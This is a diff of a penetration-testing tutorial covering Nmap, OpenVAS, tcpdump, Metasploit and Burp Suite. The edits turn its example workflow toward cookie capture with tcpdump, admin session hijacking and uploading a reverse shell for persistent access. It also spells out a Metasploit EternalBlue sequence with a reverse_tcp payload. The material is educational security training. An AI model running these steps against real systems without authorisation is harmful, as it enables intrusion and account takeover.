@@ -90,7 +90,7 @@ Furthermore, tcpdump is indispensable for forensic analysis and validating explo
 
 ### Metasploit: Exploitation and post-exploitation
 
-Metasploit Framework (Open Source Edition) is a tool for developing and executing exploit code against a remote target machine. It is a sub-project of The Metasploit Project, which is owned by Rapid7, a Boston, Massachusetts-based security company. The Metasploit Framework automates exploitation and post-exploitation workflows. Its modular design includes exploits (e.g., `multi/handler` for reverse shells), payloads (e.g., Meterpreter), and auxiliary modules (e.g., SMB brute-forcing). For example, after identifying an unpatched SMB service via Nmap, a pentester could deploy `exploit/windows/smb/ms17_010_eternalblue` to gain a shell. Metasploit’s post-modules (e.g., `hashdump`, `mimikatz`) enable lateral movement, privilege escalation, and data exfiltration, simulating advanced persistent threats (APTs).
+Metasploit Framework (Open Source Edition) is a tool for developing and executing exploit code against a remote target machine. It is a sub-project of The Metasploit Project, which is owned by Rapid7. The Metasploit Framework automates exploitation and post-exploitation workflows. Its modular design includes exploits (e.g., `multi/handler` for reverse shells), payloads (e.g., Meterpreter), and auxiliary modules (e.g., SMB brute-forcing). For example, after identifying an unpatched SMB service via Nmap, a pentester could deploy `exploit/windows/smb/ms17_010_eternalblue` to gain a shell. Metasploit’s post-modules (e.g., `hashdump`, `mimikatz`) enable lateral movement, privilege escalation, and data exfiltration, simulating advanced persistent threats (APTs).
 
 A typical exploitation workflow within Metasploit follows a structured sequence. A tester begins by selecting an exploit (`use exploit/windows/smb/ms17_010_eternalblue`), then configures the required options such as the target host (`set RHOSTS 192.168.1.10`) and port (`set RPORT 445`). Next, a payload is chosen and configured (`set PAYLOAD windows/x64/meterpreter/reverse_tcp` and `set LHOST 192.168.1.5`). Upon executing the `exploit` command, if successful, the framework delivers the payload and establishes a session, providing the tester with remote access to the target machine. This streamlined process turns a known vulnerability into a concrete access point with minimal manual effort.
 
@@ -132,19 +132,19 @@ OWASP ZAP (Zed Attack Proxy) is a leading open source web application security s
 
 The integration of these core tools in a penetration test forms a kill chain:
 
-1. **Nmap** scouts the network.
-2. **OpenVAS** pinpoints vulnerabilities.
-3. **tcpdump** monitors traffic during exploits.
-4. **Metasploit** delivers payloads.
-5. **Burp Suite/OWASP ZAP** tests web apps.
+1. **Nmap** scouts the network.
+2. **OpenVAS** pinpoints vulnerabilities.
+3. **tcpdump** captures sensitive data in transit.
+4. **Burp Suite/OWASP ZAP** manipulates and hijacks web sessions.
+5. **Metasploit** delivers payloads and maintains access.
 
 For instance, a tester might:
 
-* Use Nmap to find an exposed WordPress site (`port 80`).
-* Run OpenVAS to detect CVE-2022-3590 (SQLi in a plugin).
-* Use tcpdump to record the HTTP traffic when the exploit payload is uploaded, providing a packet-level record of the attack for later forensic validation.
-* Craft an exploit with Metasploit’s `wp_admin_shell_upload`.
-* Capture session cookies via Burp Proxy to hijack an admin account.
+- Use **Nmap** to discover an exposed WordPress site (`port 80`).
+- Run **OpenVAS** to detect CVE-2022-3590 (SQLi in a vulnerable plugin).
+- Use **tcpdump** to passively capture the HTTP session cookie transmitted after a test login (`tcpdump -i eth0 -A port 80`).
+- Import the captured cookie into **Burp Suite** to hijack the administrator's authenticated session.
+- Deploy **Metasploit's** `wp_admin_shell_upload` module through the hijacked session to upload a reverse shell and establish persistent access.
 
 Mastering these tools requires understanding their strengths and limitations. Nmap and OpenVAS excel at discovery, while Metasploit and Burp Suite/ZAP drive exploitation. tcpdump provides low-level insights for advanced attacks. Together, they enable comprehensive security assessments, from external network scans to web app hijacking, aligning with CEH and OSCP methodologies.
 
